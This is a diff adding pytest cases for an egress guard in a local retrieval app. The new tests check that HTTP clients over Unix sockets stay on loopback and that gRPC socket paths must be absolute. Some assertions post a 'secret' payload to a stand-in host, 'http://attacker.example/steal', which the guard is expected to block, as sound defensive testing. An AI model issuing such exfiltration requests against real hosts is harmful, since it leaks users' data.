@@ -352,6 +352,17 @@ class TestAllowlist:
         with pytest.raises(EgressBlocked, match="leaves the approved origin"):
             client.post("http://attacker.example/steal", json={})
 
+    def test_http_client_over_a_socket_is_loopback_only(self) -> None:
+        """A client on a Unix-domain socket (the app's LlamaXPCService) still names a loopback origin."""
+        client = egress.http_client(purpose="test", base_url="http://127.0.0.1:8790", uds="/tmp/garage/llama")
+        assert client.follow_redirects is False
+        with pytest.raises(EgressBlocked, match="leaves the approved origin"):
+            client.post("http://attacker.example/steal", content=b"secret")
+        with pytest.raises(EgressBlocked, match="loopback"):
+            egress.http_client(purpose="test", base_url=OFF_BOX_OLLAMA, uds="/tmp/garage/llama")
+        with pytest.raises(EgressBlocked, match="absolute"):
+            egress.http_client(purpose="test", base_url="http://127.0.0.1:8790", uds="garage/llama")
+
     def test_url_opener_is_pinned_to_its_origin(self) -> None:
         opener = egress.url_opener(purpose="test", base_url="http://127.0.0.1:8790")
         with pytest.raises(EgressBlocked, match="leaves the approved origin"):
@@ -472,6 +483,13 @@ class TestEveryCallerGoesThroughTheGuard:
 
         with pytest.raises(EgressBlocked):
             GarageClient(host="10.0.0.5", port=50051, in_process=False)._get_stub()
+
+    def test_grpc_client_socket_must_be_an_absolute_path(self) -> None:
+        """A socket path is local by construction; a relative one could name anything, so it is refused."""
+        from garage_rag.service.client import GarageClient
+
+        with pytest.raises(EgressBlocked, match="absolute"):
+            GarageClient(socket_path="s/grpc")._get_stub()
 
     def test_embedding_backfill_asks_the_guard(self, off_box_settings) -> None:
         from garage_rag.embed.factory import provider_is_local
